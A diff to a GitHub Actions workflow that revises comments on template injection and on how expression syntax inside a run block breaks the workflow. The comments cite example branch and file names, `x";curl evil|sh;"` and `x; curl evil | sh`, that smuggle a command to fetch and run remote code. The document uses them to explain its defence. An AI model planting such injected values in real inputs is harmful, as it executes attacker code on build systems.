@@ -169,7 +169,7 @@ jobs:
       - name: the branch stayed inside the claim it took
         env:
           ITEM: ${{ github.head_ref || github.ref_name }}
-          # A branch name is attacker-supplied text, and a `${{ }}` inside a run block is
+          # A branch name is attacker-supplied text, and an expression inside a run block is
           # pasted into the script before bash ever sees it — so a branch called
           # `x";curl evil|sh;"` would run. Through the environment it stays one string that
           # bash quotes. zizmor calls this template-injection and rates it high; it was
@@ -243,7 +243,14 @@ jobs:
           # Every name checked against one shape before it goes anywhere near a shell. A
           # path comes out of somebody's branch, and a file called `x; curl evil | sh` is a
           # legal filename — the whole reason the value travels through the environment
-          # below rather than through `${{ }}`, which is pasted in before bash parses it.
+          # below rather than through a workflow expression, which the runner substitutes
+          # before bash ever parses the line.
+          #
+          # This comment used to quote that expression's own syntax, and quoting it inside a
+          # `run:` block is enough to make the whole workflow invalid: the runner reads the
+          # script for expressions and does not care that this one is inside a `#`. The file
+          # then fails to start, which is not a failing job — it is a run with no jobs at
+          # all, named after the file, and every other job in it silently never happens.
           paths=""
           while read -r name; do
             [ -z "$name" ] && continue
